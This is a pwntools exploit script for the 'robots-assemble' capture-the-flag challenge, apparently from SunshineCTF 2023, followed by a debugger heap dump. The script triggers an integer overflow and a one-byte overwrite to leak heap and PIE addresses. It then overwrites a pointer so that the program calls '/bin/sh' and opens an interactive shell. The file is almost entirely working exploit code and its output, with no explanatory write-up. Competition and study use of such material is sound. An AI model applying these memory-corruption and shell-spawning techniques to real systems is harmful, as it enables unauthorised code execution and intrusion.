from pwn import *
from time import sleep

exe = "./robots-assemble"
elf = ELF(exe)

gdbscript = """
define hv
heap-view
end
continue
"""

context.binary = elf
context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h"]


def main():
    if args.REMOTE:
        p = remote("chal.2023.sunshinectf.games", 23000)
    elif args.RUN:
        p = process([exe])
    else:
        p = process([exe])
        gdb.attach(p, gdbscript=gdbscript)

    def setup_robot(name: bytes, iq: int, selfAware: bool, evil: bool, time: int):
        p.recvline()
        p.sendline(name)
        p.recvline()  # iq prompt
        p.sendline(str(iq).encode())
        p.recvline()  # selfAware Prompt
        p.sendline(b"y" if selfAware else b"n")
        p.recvline()  # evil prompt
        p.sendline(b"y" if evil else b"n")
        p.recvline()  # time
        p.sendline(str(time).encode())
        p.recvline()

    def finish_robot(t):
        p.sendline("1")
        p.recvline()  # iq
        p.sendline(b"1")
        p.recvline()
        p.sendline(b"y")
        p.recvline()
        p.sendline(b"y")
        p.recvline()
        p.sendline(str(t * 1000 * 1000).encode())
        p.recvline()

    p.recvline()  # number prompt
    p.sendline(str(384307168202282325).encode())  # integer overflow
    # p.sendline("4")

    ##################### INITIAL SETUP ####################################
    setup_robot(b"/bin/sh\x00", 100, True, True, 80 * 1000 * 1000)  # 0
    setup_robot(b"//bin/sh\x00", 100, True, False, 80 * 1000 * 1000)  # 1
    setup_robot(b"C", 100, False, False, 3 * 1000 * 1000)  # 2
    setup_robot(b"D", 100, False, False, 8 * 1000 * 1000)  # 3

    ##################### HEAP LEAK ####################################

    p.recvline()
    p.send(p8(0x30))  # one byte overwrite
    heapLeak = u64(p.recvline().strip().split(b":")[0].ljust(8, b"\x00"))
    heapBase = heapLeak - 0x460

    info(f"Leaked Heap Address: {heapLeak:#0x}")
    success(f"Heap Base: {heapBase:#0x}")

    time.sleep(3.3)
    finish_robot(9)

    ##################### PIE LEAK ####################################

    p.recvline()
    p.send(p64(heapLeak + 0x58))
    pieLeak = u64(p.recvline().strip().split(b":")[0].ljust(8, b"\x00"))
    pieBase = pieLeak - 0x9C0
    elf.address = pieBase
    watAddress = elf.address + 0xE42

    info(f"PIE leak: {pieLeak:#0x}")
    success(f"Binary Address: {pieBase:#0x}")
    success(f"watAddress: {watAddress:#0x}")
    time.sleep(3.3)
    finish_robot(40)

    # p.send(p64(watAddress) + p64(heapLeak - 0x70))

    ####################### WATT TARGET ###############################
    p.recvline()  # name prompt
    p.send(p64(heapLeak - 0x70) + p64(watAddress))
    info(f"/bin/sh @ {heapLeak - 0x70 + 1:#0x}")
    time.sleep(12)
    p.interactive()


if __name__ == "__main__":
    main()

"""
gefâž¤  x/64gx 0x000055bc68d053b0
0x55bc68d053b0: 0x0000000000000000      0x0000000000000041
0x55bc68d053c0: 0x0000000000000041      0x0000006400010000 1
0x55bc68d053d0: 0x0000000000000000      0x0000000000000000
0x55bc68d053e0: 0x0000000000000000      0x0000000000000000
0x55bc68d053f0: 0x0000000000000042      0x0000006400010021 2
0x55bc68d05400: 0x0000000000000000      0x0000000000000000
0x55bc68d05410: 0x0000000000000000      0x0000000000000031
0x55bc68d05420: 0x000055bc68d00043      0x00000064000009c0 3 0
0x55bc68d05430: 0x000055bc68d05460      0x000000006526ddfe
0x55bc68d05440: 0x00000000008df3b8      0x0000000000000031
0x55bc68d05450: 0x000055bc68d00044      0x00000064000009c0 4 1
0x55bc68d05460: 0x000055bc68d054f0      0x000000006526ddfe
0x55bc68d05470: 0x0000000000d0a9c6      0x0000000000000031
0x55bc68d05480: 0x000000055b003105      0x000000010000c987 5 2
0x55bc68d05490: 0x000055bc68d054c0      0x000000006526ddd9
0x55bc68d054a0: 0x000000000115e3bc      0x0000000000000031
0x55bc68d054b0: 0x000055bc68d05450      0x000055bc684309c0 6 3 # leak here
0x55bc68d054c0: 0x000055bc68d05430      0x000000006526ddde
0x55bc68d054d0: 0x000000000159f2e3      0x0000000000000031
0x55bc68d054e0: 0x000055bc68d05480      0x000055bc684309c0 7 4
0x55bc68d054f0: 0x0000000000000000      0x000000006526de04
0x55bc68d05500: 0x00000000158d702c      0x0000000000020b01
"""
